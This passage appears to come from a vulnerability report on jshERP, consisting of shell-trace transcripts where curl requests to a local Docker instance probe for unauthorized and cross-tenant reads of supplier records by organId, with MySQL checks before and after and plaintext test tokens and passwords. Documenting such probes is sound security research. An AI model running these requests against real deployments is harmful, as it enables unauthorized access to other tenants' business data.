+ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=58'\'' -H '\''X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'\''"'
{"code":200,"data":{"needDebt":0,"eachAmount":0.000000,"finishDebt":0.000000}}+ echo

+ for id in 57 58 74
+ echo 'organId=74 (attacker=test123)'
organId=74 (attacker=test123)
+ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'\''"'
+ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74' -H 'X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 69f75a16ad0d41ea9b111c7f302880a5_63'\''"'
{"code":200,"data":{"needDebt":0,"eachAmount":0.000000,"finishDebt":0.000000}}+ echo

+ step '6) 对照组：管理员 jsh 读取同样数据'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 6) 对照组：管理员 jsh 读取同样数据'
[STEP] 6) 对照组：管理员 jsh 读取同样数据
+ echo ==============================
==============================
+ for id in 57 58 74
+ echo 'organId=57 (control=jsh)'
organId=57 (control=jsh)
+ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=57'\'' -H '\''X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=57'\'' -H '\''X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'\''"'
+ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=57' -H 'X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=57'\'' -H '\''X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'\''"'
{"code":200,"data":{"needDebt":0,"eachAmount":0.000000,"finishDebt":0.000000}}+ echo

+ for id in 57 58 74
+ echo 'organId=58 (control=jsh)'
organId=58 (control=jsh)
+ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=58'\'' -H '\''X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=58'\'' -H '\''X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'\''"'
+ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=58' -H 'X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=58'\'' -H '\''X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'\''"'
{"code":200,"data":{"needDebt":0,"eachAmount":0.000000,"finishDebt":0.000000}}+ echo

+ for id in 57 58 74
+ echo 'organId=74 (control=jsh)'
organId=74 (control=jsh)
+ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'\''"'
+ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74' -H 'X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 072b104fba7e4d12873c230a8733304d_63'\''"'
{"code":200,"data":{"needDebt":0,"eachAmount":0.000000,"finishDebt":0.000000}}+ echo

+ step '7) 验证接口调用后数据库未变化（数据库状态）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 7) 验证接口调用后数据库未变化（数据库状态）'
[STEP] 7) 验证接口调用后数据库未变化（数据库状态）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
57	供应商1	供应商	0.000000	0.000000	63
58	客户1	客户	0.000000	0.000000	63
74	供应商5	供应商	0.000000	5.000000	63
+ echo

+ echo '[Context]'
[Context]
+ echo 'test123 token: 69f75a16ad0d41ea9b111c7f302880a5_63'
test123 token: 69f75a16ad0d41ea9b111c7f302880a5_63
+ echo 'jsh token: 072b104fba7e4d12873c230a8733304d_63'
jsh token: 072b104fba7e4d12873c230a8733304d_63
```

## 漏洞 4B: supplier 跨租户探测（完整命令与结果）

源文件: `/Users/yuntsy/My/Graduate/Vuln/poc_artifacts/full_transcripts/20260302_131349/04_supplier_cross_tenant_full.txt`

```text
+ set -e
+ BASE=http://127.0.0.1:9999/jshERP-boot
+ P=e10adc3949ba59abbe56e057f20f883e
+ ORGAN_ID=74
++ date +%s
+ ATTACKER=pocx1772428485
+ step '1) 查看目标供应商记录（数据库状态）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 1) 查看目标供应商记录（数据库状态）'
[STEP] 1) 查看目标供应商记录（数据库状态）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
74	供应商5	供应商	5.000000	0.000000	63
+ step '2) 创建跨租户攻击账号（自动注册新租户）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 2) 创建跨租户攻击账号（自动注册新租户）'
[STEP] 2) 创建跨租户攻击账号（自动注册新租户）
+ echo ==============================
==============================
+ REG_PAYLOAD='{"loginName":"pocx1772428485","password":"e10adc3949ba59abbe56e057f20f883e"}'
+ echo 'attacker login_name: pocx1772428485'
attacker login_name: pocx1772428485
+ echo '+ docker exec -i jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/registerUser'\'' -H '\''Content-Type: application/json'\'' --data-binary @-"'
+ docker exec -i jsherp33-app sh -lc "curl -s -X POST 'http://127.0.0.1:9999/jshERP-boot/user/registerUser' -H 'Content-Type: application/json' --data-binary @-"
++ printf %s '{"loginName":"pocx1772428485","password":"e10adc3949ba59abbe56e057f20f883e"}'
++ docker exec -i jsherp33-app sh -lc 'curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/registerUser'\'' -H '\''Content-Type: application/json'\'' --data-binary @-'
+ REG_RESP='{"msg":"操作成功","code":200}'
+ echo 'register response: {"msg":"操作成功","code":200}'
register response: {"msg":"操作成功","code":200}
+ echo '{"msg":"操作成功","code":200}'
+ grep -q '"code":200'
+ step '3) 查看攻击账号对应的用户与租户（数据库状态）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 3) 查看攻击账号对应的用户与租户（数据库状态）'
[STEP] 3) 查看攻击账号对应的用户与租户（数据库状态）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,tenant_id,ismanager,status FROM jsh_user WHERE login_name='\''pocx1772428485'\''; SELECT tenant_id,login_name,user_num_limit,expire_time FROM jsh_tenant WHERE login_name='\''pocx1772428485'\'';\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,tenant_id,ismanager,status FROM jsh_user WHERE login_name='\''pocx1772428485'\''; SELECT tenant_id,login_name,user_num_limit,expire_time FROM jsh_tenant WHERE login_name='\''pocx1772428485'\'';\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,tenant_id,ismanager,status FROM jsh_user WHERE login_name='pocx1772428485'; SELECT tenant_id,login_name,user_num_limit,expire_time FROM jsh_tenant WHERE login_name='pocx1772428485';\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,tenant_id,ismanager,status FROM jsh_user WHERE login_name='\''pocx1772428485'\''; SELECT tenant_id,login_name,user_num_limit,expire_time FROM jsh_tenant WHERE login_name='\''pocx1772428485'\'';\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
141	pocx1772428485	141	1	0
141	pocx1772428485	1000000	2034-05-19 13:14:46
+ step '4) 登录获取 jsh 与攻击者 token'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 4) 登录获取 jsh 与攻击者 token'
[STEP] 4) 登录获取 jsh 与攻击者 token
+ echo ==============================
==============================
++ login_token jsh
++ user=jsh
++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"jsh","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
+ TOKEN_JSH=98396cffac234989a2747813468ca304_63
++ login_token pocx1772428485
++ user=pocx1772428485
++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"pocx1772428485","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
+ TOKEN_ATTACK=0dec4e43ca6c4035b07a7ac716191a18_141
+ echo 'jsh token: 98396cffac234989a2747813468ca304_63'
jsh token: 98396cffac234989a2747813468ca304_63
+ echo 'attacker token: 0dec4e43ca6c4035b07a7ac716191a18_141'
attacker token: 0dec4e43ca6c4035b07a7ac716191a18_141
+ '[' -n 98396cffac234989a2747813468ca304_63 ']'
+ '[' -n 0dec4e43ca6c4035b07a7ac716191a18_141 ']'
+ step '5) 基线请求：租户 owner(jsh) 读取该 organId'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 5) 基线请求：租户 owner(jsh) 读取该 organId'
[STEP] 5) 基线请求：租户 owner(jsh) 读取该 organId
+ echo ==============================
==============================
+ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 98396cffac234989a2747813468ca304_63'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 98396cffac234989a2747813468ca304_63'\''"'
+ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74' -H 'X-Access-Token: 98396cffac234989a2747813468ca304_63'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 98396cffac234989a2747813468ca304_63'\''"'
{"code":200,"data":{"needDebt":0,"eachAmount":0.000000,"finishDebt":0.000000}}+ step '6) 攻击请求：跨租户攻击者读取同一个 organId'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 6) 攻击请求：跨租户攻击者读取同一个 organId'
[STEP] 6) 攻击请求：跨租户攻击者读取同一个 organId
+ echo ==============================
==============================
+ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 0dec4e43ca6c4035b07a7ac716191a18_141'\''"'
+ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 0dec4e43ca6c4035b07a7ac716191a18_141'\''"'
+ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74' -H 'X-Access-Token: 0dec4e43ca6c4035b07a7ac716191a18_141'"
+ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 0dec4e43ca6c4035b07a7ac716191a18_141'\''"'
{"code":500,"data":"获取数据失败"}+ step '7) 调用后再次查看目标供应商记录（数据库状态）'
+ echo

+ echo ==============================
==============================
+ echo '[STEP] 7) 调用后再次查看目标供应商记录（数据库状态）'
[STEP] 7) 调用后再次查看目标供应商记录（数据库状态）
+ echo ==============================
==============================
+ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
+ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""
+ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
mysql: [Warning] Using a password on the command line interface can be insecure.
74	供应商5	供应商	5.000000	0.000000	63
+ echo

+ echo '[Context]'
[Context]
+ echo 'jsh token: 98396cffac234989a2747813468ca304_63'
jsh token: 98396cffac234989a2747813468ca304_63
+ echo 'attacker token: 0dec4e43ca6c4035b07a7ac716191a18_141'
attacker token: 0dec4e43ca6c4035b07a7ac716191a18_141
+ echo 'attacker login: pocx1772428485'
attacker login: pocx1772428485
```
